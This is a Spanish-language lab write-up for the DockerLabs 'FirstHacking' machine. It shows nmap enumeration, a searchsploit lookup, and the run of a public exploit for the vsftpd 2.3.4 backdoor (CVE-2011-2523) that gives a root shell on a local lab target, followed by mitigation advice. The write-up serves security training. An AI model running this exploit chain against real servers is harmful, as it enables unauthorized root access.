# FirstHacking — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** Very Easy | **Target IP:** 172.17.0.2 

## Descripcion 

Laboratorio para practicar la explotación del backdoor de vsftpd 2.3.4 para obtener acceso como root.

## Attack Chain

**Nmap → FTP Enumeration → vsftpd 2.3.4 Detection → Searchsploit → Exploit Execution → Root**

### 1 Identificacion de servicios y puertos abiertos.

```text
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/firsthacking]
└─$ nmap -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 15:33 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: CE:AC:DE:EB:2C:9D (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds

```
Verificamos como unico servicio el FTP como se menciono en la descripcion de la maquina, se busca explotar el CVE de la version vsftpd 2.3.4, procedemos a realizar la explotacion de dicha vulnerabilidad. 

## 2. Busqueda de exploit y ejecucion del mismo.

Usamos searchsploit para buscar el CVE lo copias en el directorio actual de trabajo 

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/firsthacking]
└─$ searchsploit vsftpd 2.3.4 
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                               | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                  | unix/remote/17491.rb
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                          
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/firsthacking]
└─$ searchsploit -m unix/remote/49757.py
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/mariano/Downloads/dockerlabs-machines/01-muy-faciles/firsthacking/49757.py

```
Ejecutamos el script y obtenemos el acceso root a la maquina, utilizamos el .py por facilidad pero tambien se puede utilizar el metasploit.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/firsthacking]
└─$ python2 49757.py 172.17.0.2     
Success, shell opened
Send `exit` to quit shell
whoami
root

```

# Conclusión

La máquina **FirstHacking** presenta una vulnerabilidad conocida en el servicio FTP **vsftpd 2.3.4**.

Mediante la enumeración inicial fue posible identificar la versión del servicio y, utilizando `Searchsploit`, encontrar un exploit público para esta versión. Al ejecutar el exploit se consiguió acceso remoto a la máquina directamente con privilegios de `root`.

| Vulnerabilidad                 | Impacto                                                                                          | Mitigación                                                                                                  |
| ------------------------------ | ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
| **vsftpd 2.3.4 vulnerable**    | Permite obtener acceso remoto al sistema mediante la backdoor presente en esta versión.          | Actualizar `vsftpd` a una versión segura y mantener los servicios actualizados.                             |
| **Servicio FTP expuesto**      | Un servicio vulnerable accesible desde la red puede permitir el compromiso completo del sistema. | Restringir el acceso al FTP y exponer únicamente los servicios necesarios.                                  |
| **Acceso directo como `root`** | La explotación permite obtener una shell con privilegios máximos sobre la máquina.               | Aplicar el principio de mínimo privilegio y evitar ejecutar servicios vulnerables con privilegios elevados. |

## Recomendaciones generales

* Mantener los servicios y sistemas actualizados.
* No utilizar versiones de software con vulnerabilidades conocidas.
* Restringir el acceso a servicios que no sean necesarios.
* Revisar periódicamente las versiones de los servicios expuestos.
* Aplicar el principio de **mínimo privilegio**.






